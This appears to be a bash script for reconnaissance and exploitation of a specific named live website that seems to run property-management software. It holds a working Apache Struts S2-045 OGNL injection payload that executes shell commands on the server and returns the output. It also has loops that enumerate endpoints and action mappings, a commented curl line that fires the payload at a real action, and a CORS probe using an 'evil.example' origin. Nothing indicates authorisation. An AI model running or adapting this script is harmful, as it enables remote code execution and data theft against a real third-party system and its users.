URL="https://ezen.tysons.co.ke"
S2045='%{(#_=#attr["struts.request.uri"]).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess):(#dm)).(#cmd="id").(#cmds={"/bin/bash","-c",#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'

echo "=== [A] Fetch apidocs under /live and the doc pages ==="
curl -sk "${URL}/live/apidocs/" -o apidocs.html
# The nav links were /ajax/*.html from the site root — retest under /live and with XHR header:
for p in authentication dashboard repairrequest slipcollection employee announcement \
         metereading propertyinspection tenant landlord payroll linanampesa; do
  for v in "/live/ajax/${p}.html" "/live/${p}.html" "/live/apidocs/${p}.html"; do
    c=$(curl -sk -H "X-Requested-With: XMLHttpRequest" -o "t_${p}.txt" -w "%{http_code}" "${URL}${v}")
    echo "$c $v"
  done
done

echo "=== [B] Discover real action mapping (extension + namespace) ==="
for a in repairrequest slipcollection employee dashboard authentication; do
  for ext in ".action" "" ".do"; do
    echo -n "/live/ajax/${a}${ext} -> "
    curl -sk -o /dev/null -w "%{http_code} " "${URL}/live/ajax/${a}${ext}"
    curl -sk "${URL}/live/ajax/${a}${ext}" | grep -oE "Action mapped|There is no" | head -1
  done
done
# Note: "no Action mapped for namespace [/ajax]" + a DIFFERENT action-name error = namespace is right

echo "=== [C] S2-045 retried on a REAL action (use whatever returns non-404 from [B]) ==="
# Example once found:
# curl -sk -H "Content-Type: ${S2045}" "${URL}/live/ajax/repairrequest.action" | head -c 300

echo "=== [D] REST base discovery ==="
for b in "/live/rest" "/live/api" "/live/api/v1" "/live/services/api" "/live/ajax/api"; do
  echo -n "${b}/landlords -> "; curl -sk -o /dev/null -w "%{http_code}\n" "${URL}${b}/landlords"
done
# The CORS response came from the Struts backend; retry with Origin to map which paths echo ACAO:*
curl -sk -D - -o /dev/null -H "Origin: https://evil.example" "${URL}/live/apidocs/" | grep -i "access-control"
